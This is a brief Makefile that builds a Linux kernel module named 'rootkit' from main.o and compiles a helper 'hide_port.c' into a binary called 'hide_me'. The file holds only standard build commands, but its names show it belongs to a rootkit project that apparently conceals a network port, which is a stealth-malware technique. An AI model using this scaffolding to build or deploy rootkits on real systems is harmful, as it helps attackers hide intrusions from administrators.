obj-m += rootkit.o

rootkit-objs += main.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
	gcc hide_port.c -o hide_me

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
	rm hide_me